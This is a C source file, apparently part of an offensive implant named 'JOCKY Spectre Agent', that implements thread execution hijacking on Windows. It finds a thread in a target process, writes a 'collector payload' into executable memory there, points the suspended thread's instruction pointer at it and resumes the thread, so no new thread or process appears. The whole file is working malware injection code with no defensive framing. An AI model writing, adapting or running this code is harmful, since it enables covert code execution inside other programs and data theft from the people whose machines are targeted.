/*
 * JOCKY Spectre Agent — Thread Execution Hijacking
 * Suspends target thread, redirects RIP to collector payload,
 * resumes execution. No new thread or process created.
 *
 * Compiled with: cl /O2 /GS- hijack.c
 */

#include <windows.h>
#include <tlhelp32.h>

typedef struct _HIJACK_CTX {
    DWORD   targetPid;
    DWORD   targetTid;
    HANDLE  hThread;
    PVOID   payloadBase;
    CONTEXT savedContext;
} HIJACK_CTX;

/* Find a suitable thread in the target process */
static BOOL find_target_thread(DWORD pid, DWORD *tid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te = { .dwSize = sizeof(te) };
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                *tid = te.th32ThreadID;
                CloseHandle(hSnap);
                return TRUE;
            }
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);
    return FALSE;
}

/* Inject payload into target process memory */
static PVOID inject_payload(HANDLE hProcess, LPVOID payload, SIZE_T payloadSize) {
    PVOID remoteBase = VirtualAllocEx(
        hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) return NULL;

    if (!WriteProcessMemory(hProcess, remoteBase, payload, payloadSize, NULL)) {
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return NULL;
    }

    return remoteBase;
}

BOOL hijack_execute(DWORD targetPid, LPVOID payload, SIZE_T payloadSize) {
    HIJACK_CTX ctx = { .targetPid = targetPid };

    /* Step 1: Find a thread to hijack */
    if (!find_target_thread(targetPid, &ctx.targetTid))
        return FALSE;

    /* Open target process and thread */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid);
    if (!hProcess) return FALSE;

    ctx.hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, ctx.targetTid);
    if (!ctx.hThread) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 2: Suspend the target thread */
    SuspendThread(ctx.hThread);

    /* Step 3: Save current thread context */
    ctx.savedContext.ContextFlags = CONTEXT_FULL;
    GetThreadContext(ctx.hThread, &ctx.savedContext);

    /* Step 4: Inject payload into target process */
    ctx.payloadBase = inject_payload(hProcess, payload, payloadSize);
    if (!ctx.payloadBase) {
        ResumeThread(ctx.hThread);
        CloseHandle(ctx.hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Step 5: Redirect RIP to payload entry point */
    CONTEXT hijackedCtx = ctx.savedContext;
#ifdef _WIN64
    hijackedCtx.Rip = (DWORD64)ctx.payloadBase;
#else
    hijackedCtx.Eip = (DWORD)ctx.payloadBase;
#endif
    SetThreadContext(ctx.hThread, &hijackedCtx);

    /* Step 6: Resume — thread executes collector payload */
    ResumeThread(ctx.hThread);

    CloseHandle(ctx.hThread);
    CloseHandle(hProcess);
    return TRUE;
}
